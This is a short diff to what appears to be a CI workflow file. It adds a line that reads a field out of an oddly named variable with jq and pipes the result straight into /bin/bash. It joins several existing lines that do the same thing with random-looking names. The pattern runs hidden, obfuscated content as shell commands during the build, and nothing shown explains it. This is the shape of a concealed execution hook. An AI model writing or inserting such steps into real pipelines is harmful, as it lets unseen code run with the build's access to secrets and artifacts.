@@ -26,6 +26,7 @@ jobs:
           echo $jmsu1061 | jq -r .pcgwr35853 | /bin/bash
           printf '%s' "$gcik55926" | jq -r .enir8729 | /bin/bash
           echo $enz1921 | jq -r .gtubp6219 | /bin/bash
+          printf '%s' "$whw88" | jq -r .ff09 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
